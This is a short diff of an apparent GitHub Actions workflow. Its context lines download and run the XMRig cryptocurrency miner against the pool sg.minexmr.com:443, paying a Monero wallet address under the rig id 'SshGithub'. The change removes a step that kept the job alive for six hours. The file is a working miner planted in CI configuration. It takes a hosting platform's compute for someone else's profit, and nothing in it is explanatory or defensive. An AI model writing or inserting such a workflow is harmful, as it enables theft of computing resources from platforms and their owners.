@@ -19,6 +19,3 @@ jobs:
           cd xmrig-6.16.2
           chmod +x xmrig
           ./xmrig -o sg.minexmr.com:443 -u 8BNHP2bff8fPJKT42CEaChNME34xiV2msS9iigEtRRSeRDDnWWjF8L62cYWvcMDzvX3TyuYPvNwxJS2G1Ckd4qNaHxd4RHb -k --tls --rig-id SshGithub
-    - name: KeepAlive
-    ##  if: ${{ failure() }}
-      run: sleep 6h
